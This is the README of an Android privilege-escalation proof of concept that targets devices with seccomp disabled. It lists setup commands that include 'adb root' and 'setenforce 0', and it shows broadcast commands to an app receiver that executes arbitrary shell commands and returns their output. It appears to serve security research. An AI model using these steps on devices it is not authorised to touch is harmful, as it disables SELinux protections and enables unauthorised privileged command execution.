# Magica

Privilege Escalation PoC when seccomp is disabled for Android 10+.

![Android CI](https://github.com/vvb2060/Magica/workflows/Android%20CI/badge.svg?branch=master)

[Download (CI Artifacts)](https://github.com/vvb2060/Magica/actions?query=branch%3Amaster)

## Usage

```sh
adb root
adb shell setenforce 0
adb shell stop
adb shell start
./gradlew :app:iR
```

## EXEC

```sh
adb shell am broadcast -n io.github.vvb2060.puellamagi/.CommandReceiver -a io.github.vvb2060.puellamagi.action.EXEC --es cmd id
adb shell am broadcast -n io.github.vvb2060.puellamagi/.CommandReceiver -a io.github.vvb2060.puellamagi.action.EXEC --es cmd whoami
adb shell 'am broadcast -n io.github.vvb2060.puellamagi/.CommandReceiver -a io.github.vvb2060.puellamagi.action.EXEC --es cmd "su -v"'
```

For commands with parameters, enclose them in quotation marks or run them directly in the adb shell.

```sh
adb shell
am broadcast -n io.github.vvb2060.puellamagi/.CommandReceiver -a io.github.vvb2060.puellamagi.action.EXEC --es cmd "su -v"
```

The command result is returned in `Broadcast completed` output `data=`.

## License

Public domain
